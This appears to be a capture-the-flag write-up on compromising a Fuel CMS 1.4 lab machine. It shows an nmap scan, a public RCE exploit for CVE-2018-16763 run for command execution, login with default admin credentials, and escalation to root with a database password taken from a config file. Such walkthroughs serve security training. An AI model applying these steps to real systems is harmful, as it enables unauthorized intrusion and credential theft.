first start the machine and start with a basic nmap scan to find what's running 
```bash
nmap -A -p- -T4 10.48.144.132
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 10:48 +06
Nmap scan report for 10.48.144.132
Host is up (0.081s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18
| http-robots.txt: 1 disallowed entry
|_/fuel/
```
only port 80 open.
visiting the port 80 provides a default installation page of fuel cms along with version number 1.4
At the bottom of the page we find the url of admin panel also with default creds and luckily those creds haven't been changed and working
Now we have the admin panel access
I found nothing interesting there, so I searched for vulnerabilities of fuel cms 1.4
```bash
searchsploit fuel CMS 1.4
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                            | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                            | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                            | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                           | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                  | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                      | php/webapps/48778.txt
-------------------------------------------------------------------------------------- ---------------------------------
```
We have RCE exploit.

Let's exploit it. First we need to find this exploit path for execute
```bash
searchsploit -p 47138
  Exploit: fuel CMS 1.4.1 - Remote Code Execution (1)
      URL: https://www.exploit-db.com/exploits/47138
     Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py
    Codes: CVE-2018-16763
 Verified: False
File Type: Python script, ASCII text executable
Copied EDB-ID #47138's path to the clipboard
```
We have the path, now execute:
```bash
python3 /usr/share/exploitdb/exploits/php/webapps/50477.py --url http://10.10.160.108/
[+]Connecting...
Enter Command $id
systemuid=33(www-data) gid=33(www-data) groups=33(www-data)
```
we have the server access and you'll get an issue in it.
The issue you'll experience is that each command runs independently and doesn't maintain state between commands. For example, cd won't work
```bash
Enter Command $pwd
system/var/www/html


Enter Command $cd /home
system

Enter Command $pwd
system/var/www/html
```
So I made a solution, a custom exploit script(a modified version of this exploit)
Download the script and run it
then navigate to the /home/www-data/ folder for the user flag

Now it's privilege escalation time:
I ran linpeas on the target and got an interesting file to look at
/var/www/html/fuel/application/config/database.php
Upon opening we got the creds
```bash
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'REDACTED',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
```
Use the pass for switching to root and read the root flag.
